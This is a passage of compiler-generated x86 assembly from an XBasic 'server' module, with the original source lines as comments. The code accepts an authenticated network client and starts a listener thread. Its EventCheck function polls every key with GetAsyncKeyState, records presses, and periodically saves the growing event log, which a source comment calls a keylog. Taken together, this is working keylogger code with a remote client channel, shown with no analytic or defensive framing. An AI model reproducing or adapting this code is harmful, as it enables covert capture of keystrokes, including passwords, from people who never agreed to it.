	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [878] DO
align 8
do.0042.server:
;
; [879] newclient = p2pAccept (socket,@nclientip$)
#ifdef NetInit.newclient
#undef NetInit.newclient
#endif
#define NetInit.newclient ebp-64	; exposes local variable 'newclient'
;
#ifdef NetInit.nclientip$
#undef NetInit.nclientip$
#endif
#define NetInit.nclientip$ ebp-68	; exposes local variable 'nclientip$'
;
	push	[ebp-68]			;;; i674a
	push	[%3%socket.server]			;;; i672a
	call	func7C.server			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp-68],ecx			;;; i670
	mov	d[ebp-64],eax			;;; i670
;
; [880] IFF APPLSTATUS THEN EXIT DO
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.0043.server			;;; i195
	jmp	end.do.0042.server			;;; i144
else.0043.server:
end.if.0043.server:
;
; [882] buffer = NULL$(SIZE(auth))
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.105			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.105:
	mov	d[esp],eax			;;; i887
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [883] p2pListenBin (newclient,SIZE(auth),&buffer)
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.106			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.106:
	mov	d[ebp-60],eax			;;; i670
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	[ebp-60]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	func79.server			;;; i619
;
; [885] IF (buffer == auth) THEN
	mov	eax,[ebp-40]			;;; i665
	mov	ebx,[ebp-44]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> else.0044.server			;;; i219
;
; [886] IF newclient THEN
	mov	eax,d[ebp-64]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0045.server			;;; i221
;
; [887] #authok = $$FALSE' new client has connected, reset auth flag until reauthed
data section 'globals$shared'
align	4
%#authok.server:	db 4 dup ?
.code
	mov	eax,0			;;; i659
	mov	d[%#authok.server],eax			;;; i668
;
; [888] #StreamKey = $$FALSE' reset event streaming
data section 'globals$shared'
align	4
%#StreamKey.server:	db 4 dup ?
.code
	mov	eax,0			;;; i659
	mov	d[%#StreamKey.server],eax			;;; i668
;
; [890] IF client THEN
	mov	eax,d[%client.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0046.server			;;; i221
;
; [891] IFT CONNECTED THEN
	mov	eax,d[%CONNECTED.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0047.server			;;; i221
;
; [892] SendMsg (client,"CMSG \1\2*** BYE ***\r\nDISCONNECT")
	mov	eax,addr @_string.01CC.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[%client.server]			;;; i672a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [893] CONNECTED = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%CONNECTED.server],eax			;;; i668
;
; [894] p2pCloseSocket (client)
	push	[%client.server]			;;; i672a
	call	func7B.server			;;; i619
;
; [895] client = 0
	mov	eax,0			;;; i659
	mov	d[%client.server],eax			;;; i668
;
; [896] Sleep (2000)
	push	2000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [897] ELSE
	jmp	end.if.0047.server			;;; i107
else.0047.server:
;
; [898] CONNECTED = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%CONNECTED.server],eax			;;; i668
;
; [899] p2pCloseSocket (client)
	push	[%client.server]			;;; i672a
	call	func7B.server			;;; i619
;
; [900] client = 0
	mov	eax,0			;;; i659
	mov	d[%client.server],eax			;;; i668
;
; [901] Sleep (100)
	push	100			;;; i656a
	call	_Sleep@4			;;; i619
;
; [902] END IF
end.if.0047.server:
;
; [903] END IF
else.0046.server:
end.if.0046.server:
;
; [905] #cip$ = nclientip$
data section 'globals$shared'
align	4
%#cip$.server:	db 4 dup ?
.code
	mov	eax,[ebp-68]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %#cip$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [906] client = newclient
	mov	eax,d[ebp-64]			;;; i665
	mov	d[%client.server],eax			;;; i668
;
; [907] CONNECTED = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%CONNECTED.server],eax			;;; i668
;
; [909] SendMsg (client,$$SR_AUTHCMD)
	mov	eax,addr @_string.18E3.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[%client.server]			;;; i672a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [910] _beginthreadex (NULL, 0,&ListenMsg(), client, 0, &tid)
#ifdef NetInit.NULL
#undef NetInit.NULL
#endif
#define NetInit.NULL ebp-72	; exposes local variable 'NULL'
;
	mov	eax,addr _ListenMsg.server@4			;;; i599
	mov	d[ebp-60],eax			;;; i670
	lea	eax,[ebp-52]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[%client.server]			;;; i672a
	push	[ebp-60]			;;; i674a
	push	0			;;; i656a
	push	[ebp-72]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [911] Sleep (20)
	push	20			;;; i656a
	call	_Sleep@4			;;; i619
;
; [912] END IF
else.0045.server:
end.if.0045.server:
;
; [913] END IF
else.0044.server:
end.if.0044.server:
;
; [914] LOOP WHILE (APPLSTATUS == $$TRUE)
do.loop.0042.server:
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	cmp	eax,-1			;;; i684a
	je	< do.0042.server			;;; i193
end.do.0042.server:
;
; [916] ShutDown()
	call	funcD.server			;;; i619
;
; [917] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.NetInit.server:  ;;; Function end label for Assembly Programmers.
end.func3.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func3.server:
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-68]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  NetInit ()  *****
;  *****
;
; [919] FUNCTION SetReg (STRING subkey, STRING key, STRING value)
.code
;
#ifdef SetReg.subkey
#undef SetReg.subkey
#endif
#define SetReg.subkey ebp+8	; exposes function argument 'subkey'
;
;
#ifdef SetReg.key
#undef SetReg.key
#endif
#define SetReg.key ebp+12	; exposes function argument 'key'
;
;
#ifdef SetReg.value
#undef SetReg.value
#endif
#define SetReg.value ebp+16	; exposes function argument 'value'
;
align 16
_SetReg.server@12:
;  *****
;  *****  FUNCTION  SetReg ()  *****
;  *****
func50.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody50.server:
;
; [922] '	hKey = $$APINULL
;
; [923] '	IF RegOpenKeyExA ($$HKEY_CURRENT_USER, &subkey, 0, $$KEY_WRITE, &hKey) == $$ERROR_SUCCESS THEN
;
; [924] '		RegSetValueExA(hKey, &key, 0, $$REG_SZ, &value, LEN (value))
;
; [925] '		RegCloseKey(hKey)
;
; [926] '		RETURN $$TRUE
;
; [927] '	ELSE
;
; [928] '		RegCloseKey(hKey)
;
; [929] '		RETURN $$FALSE
;
; [930] '	END IF
;
; [932] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SetReg.server:  ;;; Function end label for Assembly Programmers.
end.func50.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SetReg ()  *****
;  *****
;
; [934] FUNCTION TimerCallback (timerid, msg, dwUser, dw1, dw2)
.code
;
#ifdef TimerCallback.timerid
#undef TimerCallback.timerid
#endif
#define TimerCallback.timerid ebp+8	; exposes function argument 'timerid'
;
;
#ifdef TimerCallback.msg
#undef TimerCallback.msg
#endif
#define TimerCallback.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef TimerCallback.dwUser
#undef TimerCallback.dwUser
#endif
#define TimerCallback.dwUser ebp+16	; exposes function argument 'dwUser'
;
;
#ifdef TimerCallback.dw1
#undef TimerCallback.dw1
#endif
#define TimerCallback.dw1 ebp+20	; exposes function argument 'dw1'
;
;
#ifdef TimerCallback.dw2
#undef TimerCallback.dw2
#endif
#define TimerCallback.dw2 ebp+24	; exposes function argument 'dw2'
;
align 16
_TimerCallback.server@20:
;  *****
;  *****  FUNCTION  TimerCallback ()  *****
;  *****
func4D.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody4D.server:
;
; [935] '	SHARED APPLSTATUS
;
; [936] '	SHARED CONNECTED
;
; [937] '	SHARED client
;
; [938] '
;
; [939] '
;
; [940] '	SELECT CASE timerid
;
; [941] '		CASE #pingtimer		:IF (APPLSTATUS == $$TRUE) && (CONNECTED == $$TRUE) && client THEN
;
; [942] '								SendMsg (client,"PING "+STRING$(GetTickCount()))
;
; [943] '							 END IF
;
; [944] '		CASE ELSE
;
; [945] '	END SELECT
;
; [946] '
;
; [947] '	RETURN $$TRUE
;
; [948] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.TimerCallback.server:  ;;; Function end label for Assembly Programmers.
end.func4D.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	20			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  TimerCallback ()  *****
;  *****
;
; [951] FUNCTION EventCheck ()
.code
align 16
_EventCheck.server@0:
;  *****
;  *****  FUNCTION  EventCheck ()  *****
;  *****
func56.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func56.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.119:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.119			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody56.server:
;
; [952] SHARED STRING neweventslog
data section 'globals$shared'
align	4
%neweventslog.server:	db 4 dup ?
.code
;
; [953] SHARED RECORDEVENTS
data section 'globals$shared'
align	4
%RECORDEVENTS.server:	db 4 dup ?
.code
;
; [954] SHARED APPLSTATUS
;
; [955] STATIC STRING logsnapshot
data section 'globals$statics'
align	4
%56%logsnapshot.server:	db 4 dup ?
.code
;
; [956] STATIC logsize,ologsize
data section 'globals$statics'
align	4
%56%logsize.server:	db 4 dup ?
.code
data section 'globals$statics'
align	4
%56%ologsize.server:	db 4 dup ?
.code
;
; [957] SHARED t0,tid
data section 'globals$shared'
align	4
%t0.server:	db 4 dup ?
.code
data section 'globals$shared'
align	4
%tid.server:	db 4 dup ?
.code
;
; [958] STATIC dosleep
data section 'globals$statics'
align	4
%56%dosleep.server:	db 4 dup ?
.code
;
; [959] ULONG keys[],kstate[]
#ifdef EventCheck.keys
#undef EventCheck.keys
#endif
#define EventCheck.keys ebp-40	; exposes local variable 'keys'
;
#ifdef EventCheck.kstate
#undef EventCheck.kstate
#endif
#define EventCheck.kstate ebp-44	; exposes local variable 'kstate'
;
;
; [963] IFZ t0 THEN
	mov	eax,d[%t0.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.0048.server			;;; i195
;
; [964] t0 = GetTickCount ()
;
; [0] EXTERNAL FUNCTION GetTickCount ()
	call	_GetTickCount@0			;;; i619
	mov	d[%t0.server],eax			;;; i668
;
; [965] ologsize = 0
	mov	eax,0			;;; i659
	mov	d[%56%ologsize.server],eax			;;; i668
;
; [966] dosleep = 1
	mov	eax,1			;;; i659
	mov	d[%56%dosleep.server],eax			;;; i668
;
; [967] END IF
else.0048.server:
end.if.0048.server:
;
; [969] DIM keys[255]
	sub	esp,64			;;; i430
	mov	eax,255			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[ebp-40]			;;; i665
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1073283068			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[ebp-40],eax			;;; i670
;
; [970] DIM kstate[255]
	sub	esp,64			;;; i430
	mov	eax,255			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[ebp-44]			;;; i665
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1073283068			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[ebp-44],eax			;;; i670
;
; [972] DO
align 8
do.0049.server:
;
; [973] FOR k = 0 TO 255
#ifdef EventCheck.k
#undef EventCheck.k
#endif
#define EventCheck.k ebp-48	; exposes local variable 'k'
;
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
	mov	eax,255			;;; i659
; .forlimit56.004A = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
align 8
for.004A.server:
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.004A.server			;;; i154
;
; [974] keys[k] = GetAsyncKeyState(k)
;
; [0] EXTERNAL FUNCTION GetAsyncKeyState (vKey)
	push	[ebp-48]			;;; i674a
	call	_GetAsyncKeyState@4			;;; i619
	mov	ebx,d[ebp-48]			;;; i665
	mov	ecx,d[ebp-40]			;;; i665
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	d[ebx],eax			;;; i30
;
; [975] SELECT CASE k
	mov	eax,d[ebp-48]			;;; i665
; .select56.004B = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
;
; [976] CASE $$VK_LSHIFT,$$VK_RSHIFT,$$VK_LCONTROL,$$VK_RCONTROL,$$VK_LMENU,$$VK_RMENU,$$VK_LWIN,$$VK_RWIN,$$VK_APPS :
	mov	eax,160			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	je	>> caser.004B.0000.server			;;; i70
	mov	eax,161			;;; i659
	cmp	eax,ebx			;;; i684a
	je	>> caser.004B.0000.server			;;; i70
	mov	eax,162			;;; i659
	cmp	eax,ebx			;;; i684a
	je	>> caser.004B.0000.server			;;; i70
	mov	eax,163			;;; i659
	cmp	eax,ebx			;;; i684a
	je	>> caser.004B.0000.server			;;; i70
	mov	eax,164			;;; i659
	cmp	eax,ebx			;;; i684a
	je	>> caser.004B.0000.server			;;; i70
	mov	eax,165			;;; i659
	cmp	eax,ebx			;;; i684a
	je	>> caser.004B.0000.server			;;; i70
	mov	eax,91			;;; i659
	cmp	eax,ebx			;;; i684a
	je	>> caser.004B.0000.server			;;; i70
	mov	eax,92			;;; i659
	cmp	eax,ebx			;;; i684a
	je	>> caser.004B.0000.server			;;; i70
	mov	eax,93			;;; i659
	cmp	eax,ebx			;;; i684a
	jne	>> case.004B.0001.server			;;; i71
caser.004B.0000.server:
;
; [977] IF keys[k]{1,0} THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[ebp-40]			;;; i665
	mov	eax,d[edx+eax*4]			;;; i464
	push	eax			;;; i469
	mov	eax,1			;;; i659
	mov	ebx,0			;;; i659
	pop	esi			;;; i470
	mov	ecx,ebx			;;; i479
	shr	esi,cl			;;; i480
	mov	edi,-1			;;; i481
	mov	ecx,eax			;;; i482
	shl	edi,cl			;;; i483
	not	edi			;;; i484
	and	esi,edi			;;; i485
	mov	eax,esi			;;; i486
	test	eax,eax			;;; i220
	jz	>> else.004C.server			;;; i221
;
; [978] kstate[k] = 1
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	mov	ecx,d[ebp-44]			;;; i665
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	d[ebx],eax			;;; i30
;
; [979] EventProcess (k, $$ST_DOWN)
	push	1			;;; i656a
	push	[ebp-48]			;;; i674a
	call	func57.server			;;; i619
;
; [980] ELSE
	jmp	end.if.004C.server			;;; i107
else.004C.server:
;
; [981] IF kstate[k] && !keys[k] THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[ebp-44]			;;; i665
	mov	eax,d[edx+eax*4]			;;; i464
	mov	ebx,d[ebp-48]			;;; i665
	mov	ecx,d[ebp-40]			;;; i665
	mov	ebx,d[ecx+ebx*4]			;;; i464
	neg	ebx			;;; i888
	cmc				;;; i889
	rcr	ebx,1			;;; i890
	sar	ebx,31			;;; i891
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i220
	jz	>> else.004D.server			;;; i221
;
; [982] kstate[k] = 0
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	mov	ecx,d[ebp-44]			;;; i665
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	d[ebx],eax			;;; i30
;
; [983] EventProcess (k,$$ST_UP)
	push	2			;;; i656a
	push	[ebp-48]			;;; i674a
	call	func57.server			;;; i619
;
; [984] END IF
else.004D.server:
end.if.004D.server:
;
; [985] END IF
end.if.004C.server:
;
; [987] CASE ELSE	:IF keys[k]{1,0} THEN EventProcess (k,$$ST_PRESSED)
	jmp	end.select.004B.server			;;; i69
case.004B.0001.server:
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[ebp-40]			;;; i665
	mov	eax,d[edx+eax*4]			;;; i464
	push	eax			;;; i469
	mov	eax,1			;;; i659
	mov	ebx,0			;;; i659
	pop	esi			;;; i470
	mov	ecx,ebx			;;; i479
	shr	esi,cl			;;; i480
	mov	edi,-1			;;; i481
	mov	ecx,eax			;;; i482
	shl	edi,cl			;;; i483
	not	edi			;;; i484
	and	esi,edi			;;; i485
	mov	eax,esi			;;; i486
	test	eax,eax			;;; i220
	jz	>> else.004E.server			;;; i221
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	call	func57.server			;;; i619
else.004E.server:
end.if.004E.server:
;
; [988] END SELECT
end.select.004B.server:
;
; [989] NEXT k
do.next.004A.server:
	inc	d[ebp-48]			;;; i229
	jmp	for.004A.server			;;; i231
end.for.004A.server:
;
; [991] IF (GetTickCount()-t0) > $$ST_KEYLOGT THEN' save every $$ST_KEYLOGT ms
	call	_GetTickCount@0			;;; i619
	mov	ebx,d[%t0.server]			;;; i663a
	sub	eax,ebx			;;; i791
	cmp	eax,15000			;;; i684a
	jle	>> else.004F.server			;;; i219
;
; [992] IF GetEventLogSize() > ologsize THEN' save if there is a change
	call	func5B.server			;;; i619
	mov	ebx,d[%56%ologsize.server]			;;; i663a
	cmp	eax,ebx			;;; i684a
	jle	>> else.0050.server			;;; i219
;
; [993] IF WaitForSingleObject(#mtSaveLogEx,15000) == $$WAIT_TIMEOUT THEN
data section 'globals$shared'
align	4
%#mtSaveLogEx.server:	db 4 dup ?
.code
	push	15000			;;; i656a
	push	[%#mtSaveLogEx.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0051.server			;;; i219
;
; [994] 'PRINT "EventCheck:mtSaveLogEx timeout"
;
; [995] EXIT IF 3
	jmp	end.if.004F.server			;;; i146
;
; [996] ELSE
	jmp	end.if.0051.server			;;; i107
else.0051.server:
;
; [997] '	PRINT "saving log..."
;
; [998] logsize = GetEventLogSize()
	call	func5B.server			;;; i619
	mov	d[%56%logsize.server],eax			;;; i668
;
; [999] neweventslog = RIGHT$(GetEventLog(),(logsize-ologsize))
	sub	esp,64			;;; i487
	call	func5A.server			;;; i619
	mov	d[esp],eax			;;; i887
	mov	eax,d[%56%logsize.server]			;;; i663a
	mov	ebx,d[%56%ologsize.server]			;;; i663a
	sub	eax,ebx			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_right.d.s			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr %neweventslog.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1000] ReleaseMutex (#mtSaveLogEx)
;
; [0] EXTERNAL FUNCTION ReleaseMutex (hMutex)
	push	[%#mtSaveLogEx.server]			;;; i672a
	call	_ReleaseMutex@4			;;; i619
;
; [1001] ologsize = logsize
	mov	eax,d[%56%logsize.server]			;;; i663a
	mov	d[%56%ologsize.server],eax			;;; i668
;
; [1002] dosleep = 0
	mov	eax,0			;;; i659
	mov	d[%56%dosleep.server],eax			;;; i668
;
; [1003] t0 = GetTickCount ()
	call	_GetTickCount@0			;;; i619
	mov	d[%t0.server],eax			;;; i668
;
; [1004] END IF
end.if.0051.server:
;
; [1005] END IF
else.0050.server:
end.if.0050.server:
;
; [1006] END IF
else.004F.server:
end.if.004F.server:
;
; [1008] IF dosleep THEN Sleep (3)
	mov	eax,d[%56%dosleep.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0052.server			;;; i221
	push	3			;;; i656a
	call	_Sleep@4			;;; i619
else.0052.server:
end.if.0052.server:
;
; [1009] dosleep = 1
	mov	eax,1			;;; i659
	mov	d[%56%dosleep.server],eax			;;; i668
;
; [1010] LOOP WHILE ((APPLSTATUS == $$TRUE) && (RECORDEVENTS == $$TRUE))
do.loop.0049.server:
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.115			;;; i467
	not	eax			;;; i468
A.115:
;+peep
	mov	ebx,d[%RECORDEVENTS.server]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.116			;;; i467
	not	ebx			;;; i468
A.116:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i194
	jnz	< do.0049.server			;;; i195
end.do.0049.server:
;
; [1012] 'todo: save log upon exiting, this would require a rewrite of this function and how logs are handled
;
; [1013] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func56.server			;;; i258
;
; [1014] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EventCheck.server:  ;;; Function end label for Assembly Programmers.
end.func56.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func56.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func56.server:
	mov	esi,d[ebp-44]			;;; i665
	call	%_FreeArray			;;; i424
	mov	esi,d[ebp-40]			;;; i665
	call	%_FreeArray			;;; i424
  ret
;-peep
;  *****
;  *****  END FUNCTION  EventCheck ()  *****
;  *****
;
; [1016] FUNCTION AppendEventLog (STRING text)
.code
;
#ifdef AppendEventLog.text
#undef AppendEventLog.text
#endif
#define AppendEventLog.text ebp+8	; exposes function argument 'text'
;
align 16
_AppendEventLog.server@4:
;  *****
;  *****  FUNCTION  AppendEventLog ()  *****
;  *****
func59.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,200			;;; i114a
;
funcBody59.server:
;
; [1017] SHARED STRING eventlog
data section 'globals$shared'
align	4
%eventlog.server:	db 4 dup ?
.code
;
; [1019] IFZ text RETURN $$FALSE
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.120			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0053.server			;;; i192
A.120:
	mov	eax,0			;;; i659
	jmp	end.func59.server			;;; i258
else.0053.server:
end.if.0053.server:
;
; [1020] IF WaitForSingleObject (#hsmEventLog,10000) == $$WAIT_TIMEOUT THEN
data section 'globals$shared'
align	4
%#hsmEventLog.server:	db 4 dup ?
.code
	push	10000			;;; i656a
	push	[%#hsmEventLog.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0054.server			;;; i219
;
; [1021] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func59.server			;;; i258
;
; [1022] END IF
else.0054.server:
end.if.0054.server:
;
; [1024] eventlog = eventlog + text
	mov	eax,[%eventlog.server]			;;; i663a
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %eventlog.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1025] ReleaseSemaphore (#hsmEventLog,1,NULL)
;
; [0] EXTERNAL FUNCTION ReleaseSemaphore (hSemaphore, lReleaseCount, lpPreviousCount)
#ifdef AppendEventLog.NULL
#undef AppendEventLog.NULL
#endif
#define AppendEventLog.NULL ebp-40	; exposes local variable 'NULL'
;
	push	[ebp-40]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmEventLog.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [1027] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func59.server			;;; i258
;
; [1028] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.AppendEventLog.server:  ;;; Function end label for Assembly Programmers.
end.func59.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  AppendEventLog ()  *****
;  *****
;
; [1030] FUNCTION GetEventLogSize()
.code
align 16
_GetEventLogSize.server@0:
;  *****
;  *****  FUNCTION  GetEventLogSize ()  *****
;  *****
func5B.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody5B.server:
;
; [1031] SHARED STRING eventlog
;
; [1033] IF WaitForSingleObject (#hsmEventLog,15000) == $$WAIT_TIMEOUT THEN
